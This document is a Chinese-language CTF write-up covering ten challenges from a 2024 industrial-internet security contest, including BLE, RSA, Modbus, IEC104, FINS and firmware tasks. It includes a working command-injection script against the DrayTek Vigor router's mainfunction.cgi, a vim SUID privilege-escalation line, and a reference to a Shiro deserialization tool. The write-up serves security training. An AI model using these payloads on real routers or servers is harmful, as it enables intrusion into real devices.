---
title: 2024 中国工业互联网安全大赛智能家电行业赛道 writeup by Mini-Venom
contest: 智能家电行业赛道
year: 2024
difficulty: medium
vuln_type: [forensic_memory, crypto_rsa, web_unknown, stego_traffic, reverse, web_rce]
tags: [BLE 协议 link key, binwalk, RSA gcdext 同模攻击, vigor_router 路由器, 命令注入, shiro 反序列化, Modbus 拼接图, FINS 协议, IEC104 ioa, libc.so XOR 0x17]
attack_chain: BLE pcap link key 解压压缩包 / RSA 同模攻击 (e1=3, e2=17, gcdext) / vigor_router mainfunction.cgi keyPath 注入 / shiro 反序列化 / Modbus 35152 拼接图 / IEC104 ioa 提 flag / libc.so XOR 0x17 字符串解密
key_payload: g, s, t = gmpy2.gcdext(3, 17) ; m = pow(c1, s, n) * pow(c2, t, n) % n ; from iroot(m, g)[0] ; tshark -r ics.pcapng -T fields -e modbus.regval_uint16 ; tshark -r 1.pcapng -T fields -e iec60870_asdu.ioa
one_liner: BLE+RSA gcdext+路由器注入+shiro 反序列化+Modbus 图拼接+libc XOR。
lesson: RSA 同模攻击 (e1, e2 互质) 必须用 gcdext 找逆元；工控流量 modbus 35152 是 PNG 起始 magic。
quality: medium
---
# 2024 中国工业互联网安全大赛智能家电行业赛道 writeup by Mini-Venom

## 1. BLE 协议 link key

```bash
binwalk -e ble.pcap
# 流量包中找到 link key
# dfc370110ba0a83ba1dffefcbab6616c
# 用 link key 解压压缩包得 flag
```

## 2. RSA 同模攻击

```python
from gmpy2 import *
g, s, t = gcdext(3, 17)
m = pow(c1, s, n1) * pow(c2, t, n1) % n1
m = iroot(m, g)[0]
print(long_to_bytes(m))
# cHZrcXs3MnAwMWwwNTlvMzE3N285MWszN2sxNGw1bW5sbTczM30=
# base64: pt|gs3|p001l59|317|o91k37k14l5mnlm73?}
```

e1=3, e2=17 互质，**Extended Euclidean** 找 s, t 使 `3*s + 17*t = 1` → `m^1 = c1^s * c2^t mod n`，开 g 次方根。

## 3. vigor_router 路由器

```python
import requests
host = 'http://192.3.2.238'
def run_cmd(cmd):
    url = host + "/cgi-bin/mainfunction.cgi"
    data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"
    return requests.post(url=url, data=data, timeout=(10, 15)).text
data = run_cmd('cat${IFS}/flag.txt')
```

`keyPath=%27%0A/bin/` + cmd + `%0A%27` → 引号闭合 + 换行注入。

## 4. 业务系统 shiro 反序列化

一键梭：`shiro_attack.py` 默认 key。

## 5. 智能智造上位机

```python
# 积木报表 queryFieldBySql 接口命令执行
# 提权：vim SUID
vim -c ':wq/tmp/flag' /root/flag
```

## 6. Modbus 流量拼图

```python
# tshark 提取 modbus 寄存器值
import subprocess
subprocess.run('tshark -r ics.pcapng -T fields -e modbus.regval_uint16 > modbus.txt', shell=True)
res = []
for i in f: res += i[:-1].split(",")
# 35152 = 0x8950 = PNG header \x89PNG
count = 0
for i in res:
    if i == "35152":
        count += 1
        fw = open("flag{}.png".format(count), "wb")
    fw.write(bytes.fromhex(hex(int(i))[2:].rjust(4, "0")))
```

`35152 = 0x8950` 是 PNG 文件头 `\x89\x50` (`\x89PNG` 缺 `N`，所以 `\x89P`) 的 16-bit 拼接起点。

## 7. FINS 协议响应构造

```python
# 46494e530000001b000000020000000080000200640000fc0040010231000000000101
# 响应按 FINS 协议规范构造
flag = "46494e53000000160000000200000000c0000200fc000064004001020000"
```

## 8. IEC104 规约

```bash
tshark -r 1.pcapng -T fields -e iec60870_asdu.ioa > iec.txt
# ioa 里写了 flag 的片段，拼接即 flag
```

## 9. 安卓逆向工程

`md5 + flag + str` 形式 → 32 字节 md5 + flag + 19 字节 str → 掐头去尾得 flag。

## 10. 恶意固件分析

```python
test = 'q{vplACMZY|F&Y}MUYA|nA}B&tBB&@yB%YBo&j'
a = [0]*0x25
for i in range(0x26):
    for j in range(255):
        if ord(test[i]) == j ^ 0x17:
            print(chr(j), end='')
            break
```

每个字节 `test[i] ^ 0x17` 还原真实字符串。
